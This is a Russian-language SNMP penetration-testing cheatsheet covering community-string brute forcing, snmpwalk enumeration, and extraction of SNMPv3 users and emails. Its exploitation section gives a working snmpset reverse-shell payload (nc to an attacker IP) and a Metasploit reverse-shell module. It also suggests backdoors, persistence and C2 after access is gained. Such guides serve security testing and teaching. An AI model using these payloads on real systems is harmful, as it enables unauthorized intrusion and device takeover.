#  SNMP Penetration Testing – Полный Cheatsheet

## Что такое SNMP

**SNMP** (Simple Network Management Protocol) — это протокол для мониторинга и управления сетевыми устройствами.  
Работает по модели **клиент-сервер**:

- **SNMP Manager** — система, которая запрашивает данные
- **SNMP Agent** — программа на устройстве, которая отвечает на запросы
- **MIB (Management Information Base)** — иерархическая база данных, где хранятся все параметры устройства (OID — уникальный идентификатор объекта)


## Порт

SNMP работает поверх **UDP**:

| Порт | Назначение |
|------|------------|
| **161/UDP** | Запросы менеджера → агенту (основной канал) |
| **162/UDP** | Traps — уведомления от агента менеджеру |


## Версии SNMP и их уязвимости

| Версия | Аутентификация | Шифрование | Уязвимости |
|--------|---------------|------------|------------|
| **SNMPv1** | Community string | ❌ Нет | Перехват трафика, подбор community, полный доступ |
| **SNMPv2c** | Community string | ❌ Нет | То же самое + больше функционала |
| **SNMPv3** | Есть (USM) | Есть (DES/AES) | Может быть взломан через слабые пароли, misconfiguration |

> 🧨 **Главная уязвимость SNMP** — если используется community string вида `public` / `private` / `admin`, вы почти всегда получаете доступ.


## Community Strings

Это что-то вроде **пароля** для доступа к SNMP-агенту:

- **Read-Only (RO)** — только чтение данных
- **Read-Write (RW)** — можно читать **и изменять** конфигурацию

Если вы нашли RW-community — вы, скорее всего, сможете выполнить **команды на устройстве**.


## Этапы пентеста SNMP

### 1. Разведка (Reconnaissance)

Первым делом проверяем, что порт 161 открыт и на нём висит SNMP.

```bash
sudo nmap -sU -sV <target-ip>
```

Или более целенаправленно:

```bash
nmap -sU -p 161 --script snmp-* <target-ip>
```


### 2. Брутфорс Community Strings

Если вы не знаете community, подбираем её.

**Nmap:**
```bash
nmap -sU -p 161 --script snmp-brute <target-ip> \
  --script-args snmp-brute.communitiesdb=<wordlist>
```

**Metasploit:**
```bash
use auxiliary/scanner/snmp/snmp_login
```

**Hydra:**
```bash
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target-ip> snmp
```

**Onesixtyone (быстрый брут):**
```bash
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <target-ip>
```

Если community найдена — сохраняем, она нам пригодится.


### 3. Сбор информации через snmpwalk

После того как community известна — начинаем читать всё подряд:

```bash
snmpwalk -v 2c -c <community> <target-ip> system
```

Если хотите всё дерево MIB:

```bash
snmpwalk -v 2c -c <community> <target-ip> .1
```


### 4. Сбор конкретных данных (примеры)

**Получить uptime:**
```bash
snmpget -v 2c -c <community> <target-ip> 1.3.6.1.2.1.1.3.0
```

**Получить имя устройства:**
```bash
snmpget -v 2c -c <community> <target-ip> 1.3.6.1.2.1.1.5.0
```

**Найти Trap-настройки:**
```bash
snmpwalk -v 2c -c <community> <target-ip> .1 | grep -i "trap"
```


### 5. Извлечение SNMPv3 пользователей

Даже если используется SNMPv3, через SNMPv2c можно вычитать информацию о пользователях SNMPv3:

```bash
snmpwalk -v 2c -c <community> <target-ip> .1.3.6.1.6.3.15.1.2.2.1.3
```


### 6. Извлечение email-адресов

```bash
snmpwalk -v 2c -c <community> <target-ip> .1 | grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"
```


## Важные OID для Windows и Linux

### Windows

| Данные | OID |
|--------|-----|
| Системное описание | 1.3.6.1.2.1.1.1.0 |
| Uptime | 1.3.6.1.2.1.1.3.0 |
| Контакт | 1.3.6.1.2.1.1.4.0 |
| Имя системы | 1.3.6.1.2.1.1.5.0 |
| Локация | 1.3.6.1.2.1.1.6.0 |
| Таблица интерфейсов | 1.3.6.1.2.1.2.2 |
| Описание интерфейса | 1.3.6.1.2.1.2.2.1.2 |
| Статус интерфейса | 1.3.6.1.2.1.2.2.1.8 |
| Скорость интерфейса | 1.3.6.1.2.1.2.2.1.5 |
| Размер диска | 1.3.6.1.2.1.25.2.3.1.5 |
| Использовано диска | 1.3.6.1.2.1.25.2.3.1.6 |
| Всего RAM | 1.3.6.1.2.1.25.2.3.1.5.1 |
| Свободно RAM | 1.3.6.1.2.1.25.2.3.1.6.1 |

### Linux — почти те же OID, но пути к данным могут отличаться. Подход тот же.


## Инструменты

### SNMPwn
Инструмент для тестирования SNMP-конфигураций.

```bash
git clone https://github.com/hatlord/snmpwn.git
cd snmpwn
gem install bundler
bundle install
```

Запуск с брутом пользователей и паролей:

```bash
./snmpwn.rb --hosts hosts.txt --users users.txt --passlist rockyou.txt --enclist rockyou.txt
```


## Эксплуатация

### Если есть RW-community — вы можете выполнять команды

#### Linux — Reverse Shell через SNMP

```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <community> <target-ip> \
'nsExtendStatus."command10"' = createAndGo \
'nsExtendCommand."command10"' = /usr/bin/bash \
'nsExtendArgs."command10"' = '-i "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> <port> >/tmp/f"'
```

Затем запускаем команду:

```bash
snmpwalk -v 2c -c <community> <target-ip> nsExtendObjects
```

#### Linux — через Metasploit

```bash
msfconsole -q
use exploit/linux/snmp/net_snmpd_rw_access
set RHOSTS <target-ip>
set PAYLOAD generic/shell_reverse_tcp
set LHOST <your-ip>
exploit
```


### SNMP Shell (удобная обёртка)

```bash
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
pip install -r requirements.txt
rlwrap python shell.py <target-ip> -c <community>
```


## Windows RCE через SNMP

Если SNMP настроен с RW-community на Windows, вы можете:

- Менять конфигурацию
- Запускать команды через расширения SNMP
- Использовать для post-exploitation


## Post-exploitation

Что делать, если вы уже внутри:

- Собрать конфигурации
- Вычитать пароли из MIB (если есть)
- Поставить бэкдор
- Поднять свой SNMP-агент для персистентности
- Использовать SNMP как канал C2


## Traps (уведомления)

**Trap** — это сообщение от агента менеджеру, например, об ошибке.

В некоторых случаях можно:

- Перехватывать трапы (UDP 162)
- Подделывать трапы
- Использовать для движения по сети


## Полезные ссылки

- [MIB Browser Online](https://mibbrowser.online/)
- [SNMP Data Harvesting — Rapid7](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/)
- [Abusing Linux SNMP for RCE](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce)


## Итоговый чек-лист пентестера SNMP

- [ ] Проверить открытые UDP 161/162
- [ ] Узнать версию SNMP
- [ ] Подобрать community (public/private/брут)
- [ ] Выполнить `snmpwalk` для сбора данных
- [ ] Вычитать пользователей, email, интерфейсы, диски
- [ ] Проверить, есть ли RW-community
- [ ] Если есть — пробовать RCE (Linux/Windows)
- [ ] Использовать SNMP для движения по сети
- [ ] Собрать доказательства и задокументировать

